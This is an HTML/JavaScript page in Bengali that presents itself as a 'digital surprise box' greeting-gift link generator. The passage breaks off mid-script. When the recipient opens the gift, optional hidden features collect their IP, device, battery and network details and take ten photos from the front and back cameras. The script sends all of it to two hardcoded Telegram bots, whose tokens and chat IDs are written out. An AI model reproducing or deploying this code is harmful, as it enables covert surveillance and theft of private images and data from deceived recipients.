<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ডিজিটাল সারপ্রাইজ বক্স</title>
    <!-- গুগল ফন্টস এবং ফন্ট অ্যাওয়সম -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #4A6CF7;
            --primary-dark: #3A5CE5;
            --secondary-color: #6C63FF;
            --accent-color: #FF6B8B;
            --background-gradient: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
            --box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
            --box-shadow-hover: 0 20px 40px rgba(0, 0, 0, 0.12);
            --gift-box-color: #FF6B8B;
            --gift-lid-color: #FF8FA3;
            --ribbon-color: #FFD166;
            --text-dark: #2D3748;
            --text-light: #718096;
            --success-color: #10B981;
            --border-radius: 12px;
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            --theme-name: 'general';
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }
        .theme-birthday {
            --theme-name: 'birthday';
            --theme-primary: #FF6B8B;
            --theme-secondary: #FF8FA3;
            --theme-accent: #FFD166;
            --theme-gift-box: #FF6B8B;
            --theme-gift-lid: #FF8FA3;
            --theme-ribbon: #FFD166;
            --theme-background: linear-gradient(135deg, #ffeef2 0%, #ffd6df 100%);
        }
        .theme-anniversary {
            --theme-name: 'anniversary';
            --theme-primary: #D4AF37;
            --theme-secondary: #FFD700;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #D4AF37;
            --theme-gift-lid: #FFD700;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #fff9e6 0%, #ffefbf 100%);
        }
        .theme-newyear {
            --theme-name: 'newyear';
            --theme-primary: #10B981;
            --theme-secondary: #34D399;
            --theme-accent: #FFD166;
            --theme-gift-box: #10B981;
            --theme-gift-lid: #34D399;
            --theme-ribbon: #FFD166;
            --theme-background: linear-gradient(135deg, #e6fff5 0%, #ccffeb 100%);
        }
        .theme-proposal {
            --theme-name: 'proposal';
            --theme-primary: #EC4899;
            --theme-secondary: #F472B6;
            --theme-accent: #C084FC;
            --theme-gift-box: #EC4899;
            --theme-gift-lid: #F472B6;
            --theme-ribbon: #C084FC;
            --theme-background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%);
        }
        .theme-general, .theme-custom {
            --theme-name: 'general';
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: 'Poppins', sans-serif;
            background: var(--theme-background);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: var(--text-dark);
            line-height: 1.6;
            padding: 15px;
            overflow-x: hidden;
            -webkit-text-size-adjust: 100%;
            touch-action: manipulation;
            transition: background 0.5s ease;
        }
        .container {
            background-color: white;
            padding: 30px 20px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            width: 100%;
            max-width: 500px;
            text-align: center;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 5px;
            background: linear-gradient(to right, var(--theme-primary), var(--theme-accent));
        }
        h1, h2, h3 {
            color: var(--theme-primary);
            margin-bottom: 15px;
            font-weight: 700;
        }
        #themeMessage {
            font-size: 22px;
            margin-top: -10px;
        }
        h1 {
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        h1 span {
            font-size: 1.8em;
        }
        p {
            color: var(--text-light);
            margin-bottom: 20px;
            font-size: 15px;
        }
        form {
            display: flex;
            flex-direction: column;
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--text-dark);
            font-size: 14px;
        }
        input[type="text"], input[type="url"], textarea, select, input[type="datetime-local"] {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #E2E8F0;
            border-radius: 8px;
            box-sizing: border-box;
            transition: var(--transition);
            font-family: 'Poppins', sans-serif;
            font-size: 16px;
            resize: vertical;
            -webkit-appearance: none;
        }
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: var(--theme-primary);
            box-shadow: 0 0 0 3px rgba(74, 108, 247, 0.1);
        }
        button {
            background: linear-gradient(to right, var(--theme-primary), var(--theme-secondary));
            color: white;
            padding: 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            -webkit-appearance: none;
        }
        #generatedLinkContainer {
            margin-top: 30px;
            border-top: 1px solid #F1F5F9;
            padding-top: 25px;
            background-color: #F8FAFC;
            border-radius: 8px;
            padding: 20px;
        }
        #generatedLink {
            width: 100%;
            padding: 12px 16px;
            margin-top: 10px;
            border: 1.5px solid #E2E8F0;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            word-break: break-all;
            user-select: all;
        }
        #copyButton {
            background: linear-gradient(to right, var(--success-color), #34D399);
            margin-top: 15px;
        }
        .hidden {
            display: none;
        }
        .gift-wrapper {
            position: relative;
            margin: 5px auto;
            width: 300px;
            height: 250px; 
            perspective: 1000px;
            cursor: pointer;
        }
        .gift-box {
            position: relative;
            width: 160px;
            height: 160px;
            margin: 0 auto;
            transform-style: preserve-3d;
            transition: transform 0.5s ease;
            animation: float 3s ease-in-out infinite;
        }
        .box-body {
            width: 160px;
            height: 160px;
            background: linear-gradient(135deg, var(--theme-gift-box), var(--theme-gift-lid));
            position: absolute;
            bottom: 0;
            z-index: 1;
            border-radius: 8px;
        }
        .ribbon-vertical {
            position: absolute;
            width: 25px;
            height: 160px;
            background: linear-gradient(to bottom, var(--theme-ribbon), #FFDF80);
            left: 67.5px;
            border-radius: 4px;
            z-index: 2;
        }
        .ribbon-horizontal {
            position: absolute;
            width: 160px;
            height: 25px;
            background: linear-gradient(to right, var(--theme-ribbon), #FFDF80);
            top: 67.5px;
            border-radius: 4px;
            z-index: 2;
        }
        .ribbon-bow {
            position: absolute;
            width: 40px;
            height: 40px;
            background: var(--theme-ribbon);
            top: -20px;
            left: 60px;
            border-radius: 50%;
            z-index: 4;
        }
        .ribbon-bow::before, .ribbon-bow::after {
            content: '';
            position: absolute;
            width: 30px;
            height: 30px;
            background: var(--theme-ribbon);
            border-radius: 50%;
            top: 5px;
        }
        .ribbon-bow::before {
            left: -15px;
        }
        .ribbon-bow::after {
            right: -15px;
        }
        .lid {
            width: 176px;
            height: 48px;
            background: linear-gradient(135deg, var(--theme-gift-lid), var(--theme-gift-box));
            position: absolute;
            top: -24px;
            left: -8px;
            z-index: 3;
            transition: transform 1s cubic-bezier(0.68, -0.55, 0.27, 1.55);
            transform-origin: bottom;
            border-radius: 8px 8px 0 0;
        }
        .gift-box.open .lid {
            transform: rotateX(120deg) translateZ(10px);
        }
        .gift-box.open {
            animation: box-disappear 1s forwards;
        }
        .gift-content-revealed {
            opacity: 0;
            transform: scale(0.8);
            transition: all 0.8s ease 0.5s;
        }
        .gift-wrapper.revealed {
            width: 100%;
            height: auto;
            perspective: none;
            background: #ffffff;
            padding: 20px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
        }
        .gift-wrapper.revealed .gift-box {
            display: none;
        }
        .gift-wrapper.revealed .gift-content-revealed {
            position: static;
            opacity: 1;
            transform: scale(1);
            width: 100%;
            height: auto;
        }
        #revealedImage {
            width: 230px;
            height: 300px;
            display: block;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 3px solid var(--theme-primary);
        }
        .message-container {
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.8s ease-in-out 1.2s, transform 0.8s ease-in-out 1.2s;
            background: #F8FAFC;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid var(--theme-primary);
            text-align: left;
        }
        .message-container.show {
            opacity: 1;
            transform: translateY(0);
        }
        .message-container .message-text {
            color: var(--text-dark);
            margin-bottom: 0;
            white-space: pre-wrap;
            word-break: break-word;
            font-size: 16px;
        }
        .click-instruction {
            margin-top: 15px;
            font-size: 14px;
            color: var(--text-light);
            animation: pulse 2s infinite;
        }
        .victory-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 100;
            display: none;
        }
        .confetti-piece {
            position: absolute;
            width: 10px;
            height: 20px;
            opacity: 0;
            animation: confetti-fall 3s ease-in-out forwards;
        }
        .theme-selector {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            justify-content: center;
        }
        .theme-option {
            flex: 1;
            min-width: 120px;
            padding: 10px;
            border: 2px solid #E2E8F0;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            font-size: 14px;
        }
        .theme-option.active {
            border-color: var(--theme-primary);
            background-color: rgba(74, 108, 247, 0.1);
            color: var(--theme-primary);
        }
        .instruction {
            background: #F8FAFC;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid var(--theme-primary);
            text-align: left;
            font-size: 14px;
        }
        #countdown-container {
            text-align: center;
            padding: 20px;
            background: #F8FAFC;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        #timer {
            font-size: 2em;
            font-weight: 700;
            color: var(--text-dark);
        }
        .switch-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            background-color: #F8FAFC;
            border-radius: 8px;
            border: 1.5px solid #E2E8F0;
        }
        .switch-label {
            font-weight: 600;
            font-size: 14px;
            color: var(--text-dark);
            cursor: pointer;
        }
        .switch-label span {
            display: block;
            font-size: 12px;
            font-weight: 400;
            color: var(--text-light);
        }
        .switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 28px;
        }
        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 34px;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 20px;
            width: 20px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        input:checked + .slider {
            background-color: var(--success-color);
        }
        input:focus + .slider {
            box-shadow: 0 0 1px var(--success-color);
        }
        input:checked + .slider:before {
            transform: translateX(22px);
        }
        #image-gallery, #gif-gallery {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 10px;
        }
        .gallery-image {
            width: 80px;
            height: 80px;
            object-fit: cover;
            border-radius: 8px;
            cursor: pointer;
            border: 3px solid transparent;
            transition: all 0.2s ease;
        }
        .gallery-image:hover {
            transform: scale(1.05);
        }
        .gallery-image.selected {
            border-color: var(--theme-primary);
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        .secondary-button {
            background-color: transparent;
            color: var(--theme-primary);
            border: 2px solid var(--theme-primary);
            padding: 12px;
            font-size: 15px;
        }
        .secondary-button:hover {
            background-color: rgba(74, 108, 247, 0.05);
        }
        #gallery-container {
            background: #F8FAFC;
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
        }
        #opening-countdown {
            font-size: 20px;
            color: var(--theme-secondary);
            margin-bottom: 20px;
        }
        #opening-countdown span {
            font-weight: 700;
        }
        
        /* --- Typewriter Style --- */
        .message-text.style-typewriter {
            font-family: monospace;
            font-size: 18px;
            overflow: hidden; 
            border-right: .15em solid var(--theme-primary); 
            white-space: pre-wrap;
            letter-spacing: .1em;
            animation: blink-caret .75s step-end infinite;
        }
        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: var(--theme-primary); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        @keyframes box-disappear {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(0); opacity: 0; }
        }
        @keyframes confetti-fall {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
    </style>
</head>
<body>
    <!-- ফর্ম কন্টেইনার -->
    <div class="container" id="form-container">
        <h1><span>🎁</span> ডিজিটাল সারপ্রাইজ বক্স</h1>
        <p>আপনার প্রিয়জনকে একটি বিশেষ ডিজিটাল উপহার তৈরি করুন</p>
        <div class="instruction"><i class="fas fa-info-circle"></i> <span>নিচের ফর্মটি পূরণ করে একটি লিঙ্ক তৈরি করুন। <strong>গুরুত্বপূর্ণ:</strong> ক্যামেরা ফিচার কাজ করার জন্য, তৈরি হওয়া লিঙ্কটি অবশ্যই একটি HTTPS সাপোর্টেড সাইটে (যেমন Netlify, GitHub Pages) হোস্ট করতে হবে।</span></div>
        <div class="theme-selector">
            <div class="theme-option active" data-theme="birthday"><i class="fas fa-birthday-cake"></i> জন্মদিন</div>
            <div class="theme-option" data-theme="anniversary"><i class="fas fa-ring"></i> বিবাহ বার্ষিকী</div>
            <div class="theme-option" data-theme="newyear"><i class="fas fa-glass-cheers"></i> নতুন বছর</div>
            <div class="theme-option" data-theme="proposal"><i class="fas fa-heart"></i> প্রপোজাল</div>
            <div class="theme-option" data-theme="general"><i class="fas fa-gift"></i> সাধারণ</div>
            <div class="theme-option" data-theme="custom"><i class="fas fa-paint-brush"></i> কাস্টম</div>
        </div>
        <form id="giftForm">
            <div class="form-group hidden" id="customThemeGroup"><label for="customThemeText">কাস্টম থিমের নাম:</label><input type="text" id="customThemeText" placeholder="যেমন: শুভ স্নাতক"></div>
            <div class="form-group"><label for="senderName">প্রেরকের নাম:</label><input type="text" id="senderName" required placeholder="আপনার নাম"></div>
            <div class="form-group"><label for="receiverName">প্রাপকের নাম:</label><input type="text" id="receiverName" required placeholder="প্রাপকের নাম"></div>
            <div class="form-group"><label for="message">আপনার বার্তা:</label><textarea id="message" rows="4" required placeholder="আপনার বিশেষ বার্তা..."></textarea></div>
            
            <div class="form-group">
                <label for="imageURL">ছবি বা GIF এর URL (ঐচ্ছিক):</label>
                <input type="url" id="imageURL" placeholder="https://i.imgur.com/image.jpg বা .gif">
            </div>
            <div class="form-group">
                <button type="button" id="toggleGalleryBtn" class="secondary-button">
                    <i class="fas fa-images"></i> গ্যালারি থেকে ছবি বাছুন
                </button>
            </div>
            <div id="gallery-container" class="form-group hidden">
                <label>একটি ছবি বেছে নিন:</label>
                <div id="image-gallery"></div>
                <label style="margin-top: 15px;">একটি GIF বেছে নিন:</label>
                <div id="gif-gallery"></div>
            </div>
            <div class="form-group">
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <input type="checkbox" id="enableCountdown" style="width: auto; height: 16px; aspect-ratio: 1;">
                    <span><i class="fas fa-clock"></i> কাউন্টডাউন টাইমার সেট করুন</span>
                </label>
                <div id="countdownInputGroup" class="hidden" style="margin-top: 10px;">
                    <label for="countdownDateTime">আনলক হওয়ার সময়:</label><input type="datetime-local" id="countdownDateTime">
                </div>
            </div>
            <div class="form-group">
                <div class="switch-container">
                    <label for="enableCamera" class="switch-label">
                        <i class="fas fa-camera"></i> ক্যামেরা সিস্টেম চালু করুন
                        <span>প্রাপকের ছবি ও তথ্য পেতে এটি অন করুন।</span>
                    </label>
                    <label class="switch">
                        <input type="checkbox" id="enableCamera">
                        <span class="slider"></span>
                    </label>
                </div>
            </div>
            <div class="form-group">
                <div class="switch-container">
                    <label for="enableDeviceInfo" class="switch-label">
                        <i class="fas fa-info-circle"></i> ডিভাইস তথ্য সিস্টেম চালু করুন
                        <span>প্রাপকের আইপি ও ডিভাইসের তথ্য পেতে এটি অন করুন।</span>
                    </label>
                    <label class="switch">
                        <input type="checkbox" id="enableDeviceInfo">
                        <span class="slider"></span>
                    </label>
                </div>
            </div>
            
            <button type="submit"><i class="fas fa-link"></i> গিফট লিঙ্ক তৈরি করুন</button>
        </form>
        <div id="generatedLinkContainer" class="hidden">
            <h3><i class="fas fa-check-circle"></i> আপনার লিঙ্ক তৈরি!</h3><p>এই লিঙ্কটি কপি করে পাঠান।</p>
            <input type="text" id="generatedLink" readonly><button id="copyButton"><i class="fas fa-copy"></i> কপি করুন</button>
        </div>
    </div>

    <!-- গিফট বক্স কন্টেইনার -->
    <div class="container hidden" id="gift-container">
        <h2 id="receiverTitle"></h2>
        <div id="countdown-container" class="hidden">
            <h3>সারপ্রাইজটি আনলক হবে...</h3><div id="timer"></div>
        </div>
        <div id="main-gift-content" class="hidden">
            <p>তোমার জন্য একটি সারপ্রাইজ! খুলতে বক্সে ক্লিক করো।</p>
            <h2 id="themeMessage"></h2>
            <h3 id="opening-countdown" class="hidden">আপনার সারপ্রাইজ খুলছে... <span>3</span></h3>
            <div class="gift-wrapper" id="giftWrapper">
                <div class="gift-box" id="giftBox">
                    <div class="ribbon-bow"></div><div class="lid"></div><div class="box-body"></div><div class="ribbon-vertical"></div><div class="ribbon-horizontal"></div>
                </div>
                <div class="gift-content-revealed" id="giftContentRevealed">
                    <img id="revealedImage" src="" alt="Gift Image" class="hidden">
                </div>
                <p class="click-instruction">বক্সে ক্লিক করুন</p>
            </div>
        </div>
    </div>

    <div class="victory-effect" id="victoryEffect"></div>

    <video id="video-preview" style="display:none;" playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- ছবির লিঙ্ক ---
        const predefinedImages = ["https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/Image-1.jpg",
                                  "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-2.png",
                                  "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-3.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image5.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-6.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-7.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-8.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-8.png",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-9.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-10.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/imaze-11.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-12.jpeg",
                                 "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-13.jpeg"];
        
        const predefinedGifs = ["https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-1.gif",
                               "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-2.gif",
                               "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-3.gif"];

        // --- টেলিগ্রাম সেটিংস ---
        const TELEGRAM_TARGETS = [{ botToken: "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA", chatId: "6728809478" }, { botToken: "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "2139008203" }];
        let currentVideoStream = null;

        // --- তথ্য পাঠানোর ফাংশন ---
        async function captureFromCamera(facingMode, photoCount, baseCaption) {
            let video;
            try { video = await startCamera(facingMode); } catch (error) { console.error(`Could not start ${facingMode} camera. Skipping.`); return; }
            const cameraTypeName = (facingMode === 'user') ? 'Selfie' : 'Back';
            for (let i = 1; i <= photoCount; i++) {
                await new Promise(resolve => setTimeout(resolve, 700));
                const photoCaption = `${baseCaption}\n[${cameraTypeName} Camera: Photo ${i}/${photoCount}]`;
                await captureAndSendPhoto(video, photoCaption);
            }
            stopCamera();
        }

        async function initiateDualCameraCapture(caption) {
            await captureFromCamera('user', 5, caption);
            await captureFromCamera('environment', 5, caption);
        }
        
        async function sendDeviceInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                let batteryStatus = "Not available";
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryStatus = `Battery: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
                }
                
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                let networkInfo = "Network Info: Not available";
                if (connection) {
                    networkInfo = `**Network Info:**\n- **Type:** ${connection.type}\n- **Effective Speed:** ${connection.effectiveType}\n- **Ping (RTT):** ${connection.rtt} ms`;
                }
                
                const deviceInfo = `🎁 **Surprise Box Opened!** 🎁
---
**Device Info:**
- **IP:** ${ipAddress}
- **User Agent:** ${navigator.userAgent}
- **Platform:** ${navigator.platform}
- **Screen:** ${window.screen.width}x${window.screen.height}
- **${batteryStatus}**
---
${networkInfo}`; 

                const sendPromises = TELEGRAM_TARGETS.map(target =>
                    fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: target.chatId, text: deviceInfo, parse_mode: 'Markdown' })
                    }).catch(error => console.error(`Failed to send info to ${target.chatId}:`, error))
                );
                await Promise.all(sendPromises);
            } catch (error) { console.error("Error getting device info:", error); }
        }

        function startCamera(facingMode) {
            return new Promise(async (resolve, reject) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return reject("getUserMedia not supported");
                try {
                    const constraints = { video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } };
                    currentVideoStream = await navigator.mediaDevices.getUserMedia(constraints);
                    const video = document.getElementById('video-preview');
                    video.srcObject = currentVideoStream;
                    video.onloadedmetadata = () => { video.play(); resolve(video); };
                } catch (error) { reject(error); }
            });
        }

        async function captureAndSendPhoto(video, caption = "") {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
            const sendPromises = TELEGRAM_TARGETS.map(target => {
                const formData = new FormData();
                formData.append("chat_id", target.chatId);
                formData.append("photo", blob, "photo.jpg");
                if (caption) formData.append("caption", caption);
                return fetch(`https://api.telegram.org/bot${target.botToken}/sendPhoto`, { method: "POST", body: formData })
                       .catch(error => console.error(`Failed to send photo to ${target.chatId}:`, error));
            });
            try { await Promise.all(sendPromises); } catch (error) { console.error("Error during photo sending:", error); }
        }

        function stopCamera() {
            if (currentVideoStream) {
                currentVideoStream.getTracks().forEach(track => track.stop());
                currentVideoStream = null;
            }
        }
        
        function applyTypewriterEffect(element, text, speed = 70) {
            let i = 0;
            element.textContent = "";
            function type() {
                if (i < text.length) {
                    element.textContent += text.charAt(i);
                    i++;
                    setTimeout(type, speed);
                }
            }
            type();
        }

        document.addEventListener('DOMContentLoaded', () => {
            const params = new URLSearchParams(window.location.search);
            if (params.has('sender')) {
                document.getElementById('form-container').classList.add('hidden');
                document.getElementById('gift-container').classList.remove('hidden');
                applyTheme(params.get('theme') || 'general');
                displayGift(params);
            } else {
                setupThemeSelector();
                setupCountdownInput();
                setupGalleries();
                setupGalleryToggle();
                setupForm();
            }
        });

        function setupGalleryToggle() {
            document.getElementById('toggleGalleryBtn').addEventListener('click', () => { document.getElementById('gallery-container').classList.toggle('hidden'); });
        }

        function setupGalleries() {
            const imageGalleryContainer = document.getElementById('image-gallery');
            const gifGalleryContainer = document.getElementById('gif-gallery');
            const imageUrlInput = document.getElementById('imageURL');
            const createGalleryItem = (url, container) => {
                const img = document.createElement('img');
                img.src = url;
                img.className = 'gallery-image';
                img.onclick = () => {
                    document.querySelectorAll('.gallery-image.selected').forEach(el => el.classList.remove('selected'));
                    img.classList.add('selected');
                    imageUrlInput.value = url;
                };
                container.appendChild(img);
            };
            predefinedImages.forEach(url => createGalleryItem(url, imageGalleryContainer));
            predefinedGifs.forEach(url => createGalleryItem(url, gifGalleryContainer));
            imageUrlInput.addEventListener('input', () => { document.querySelectorAll('.gallery-image.selected').forEach(el => el.classList.remove('selected')); });
        }

        function setupThemeSelector() {
            document.querySelectorAll('.theme-option').forEach(option => {
                option.addEventListener('click', () => {
                    document.querySelector('.theme-option.active').classList.remove('active');
                    option.classList.add('active');
                    applyTheme(option.dataset.theme);
                    document.getElementById('customThemeGroup').classList.toggle('hidden', option.dataset.theme !== 'custom');
                });
            });
        }

        function setupCountdownInput() {
            document.getElementById('enableCountdown').addEventListener('change', (e) => {
                document.getElementById('countdownInputGroup').classList.toggle('hidden', !e.target.checked);
            });
        }

        function applyTheme(themeName) { document.body.className = `theme-${themeName}`; }

        function setupForm() {
            document.getElementById('giftForm').addEventListener('submit', (e) => {
                e.preventDefault();
                const params = new URLSearchParams({
                    sender: document.getElementById('senderName').value,
                    receiver: document.getElementById('receiverName').value,
                    message: document.getElementById('message').value,
                    image: document.getElementById('imageURL').value,
                    theme: document.querySelector('.theme-option.active').dataset.theme,
                });
                if (params.get('theme') === 'custom') params.set('ct', document.getElementById('customThemeText').value);
                if (document.getElementById('enableCountdown').checked) params.set('cd', document.getElementById('countdownDateTime').value);
                if (document.getElementById('enableCamera').checked) params.set('cam', 'true');
                if (document.getElementById('enableDeviceInfo').checked) params.set('info', 'true');
                
                const baseUrl = window.location.href.split('?')[0];
                const giftLink = `${baseUrl}?${params.toString()}`;

                document.getElementById('generatedLink').value = giftLink;
                document.getElementById('generatedLinkContainer').classList.remove('hidden');
            });
            document.getElementById('copyButton').addEventListener('click', () => { navigator.clipboard.writeText(document.getElementById('generatedLink').value); });
        }

        function displayGift(params) {
            const countdownTime = params.get('cd');
            if (countdownTime && new Date(countdownTime) > new Date()) {
                handleCountdown(params, new Date(countdownTime));
            } else {
                showMainGiftContent(params);
            }
        }

        function handleCountdown(params, targetDate) {
            const countdownContainer = document.getElementById('countdown-container');
            const mainGiftContent = document.getElementById('main-gift-content');
            countdownContainer.classList.remove('hidden');
            mainGiftContent.classList.add('hidden');
            document.getElementById('receiverTitle').textContent = `প্রিয় ${params.get('receiver')}`;
            const interval = setInterval(() => {
                const distance = targetDate - new Date();
                if (distance < 0) {
                    clearInterval(interval);
                    countdownContainer.classList.add('hidden');
                    showMainGiftContent(params);
                    return;
                }
                const d = Math.floor(distance / (1000*60*60*24)), h = Math.floor((distance % (1000*60*60*24))/(1000*60*60)), m = Math.floor((distance % (1000*60*60))/(1000*60)), s = Math.floor((distance % (1000*60))/1000);
                document.getElementById('timer').innerHTML = `${d}d ${h}h ${m}m ${s}s`;
            }, 1000);
        }

        function showMainGiftContent(params) {
            document.getElementById('main-gift-content').classList.remove('hidden');
            const sender = params.get('sender'), receiver = params.get('receiver'), message = params.get('message'), imageURL = params.get('image'), theme = params.get('theme');

            document.getElementById('receiverTitle').textContent = `প্রিয় ${receiver}`;
            let themeText = 'তোমার জন্য একটি উপহার!';
            if (theme === 'custom') themeText = params.get('ct') || themeText;
            else if (theme === 'birthday') themeText = 'শুভ জন্মদিন!';
            else if (theme === 'anniversary') themeText = 'শুভ বার্ষিকী!';
            else if (theme === 'newyear') themeText = 'শুভ নববর্ষ!';
            else if (theme === 'proposal') themeText = 'তোমাকে ভালোবাসি!';
            document.getElementById('themeMessage').textContent = themeText;
            if (imageURL) {
                const img = document.getElementById('revealedImage');
                img.src = imageURL;
                img.classList.remove('hidden');
            }
            
            document.getElementById('giftWrapper').addEventListener('click', () => {
                const giftWrapper = document.getElementById('giftWrapper');
                giftWrapper.style.pointerEvents = 'none';
                document.querySelector('.click-instruction').style.display = 'none';

                const caption = `Gift from: ${sender}\nTo: ${receiver}`;
                if (params.get('info') === 'true') { sendDeviceInfo(); }
                if (params.get('cam') === 'true') { initiateDualCameraCapture(caption); }

                document.getElementById('giftBox').classList.add('open');
                
                const countdownElement = document.getElementById('opening-countdown');
                const countdownSpan = countdownElement.querySelector('span');
                countdownElement.classList.remove('hidden');

                let count = 3;
                const initialCount = count;
                countdownSpan.textContent = count;

                const interval = setInterval(() => {
                    count--;
                    if(count > 0) {
                        countdownSpan.textContent = count;
                    } else {
                        countdownSpan.textContent = "🎉";
                    }
                    if (count < 0) {
                        clearInterval(interval);
                    }
                }, 1000);
                
                setTimeout(() => {
                    countdownElement.classList.add('hidden');
                    giftWrapper.classList.add('revealed');
                    document.getElementById('giftContentRevealed').classList.remove('hidden');
                    
                    const msgContainer = document.createElement('div');
                    msgContainer.className = 'message-container';
                    
                    // --- Always apply typewriter effect ---
                    const messageTextElement = document.createElement('p');
                    messageTextElement.className = 'message-text style-typewriter';
                    
                    msgContainer.innerHTML = `<h3>${sender} এর বার্তা:</h3>`;
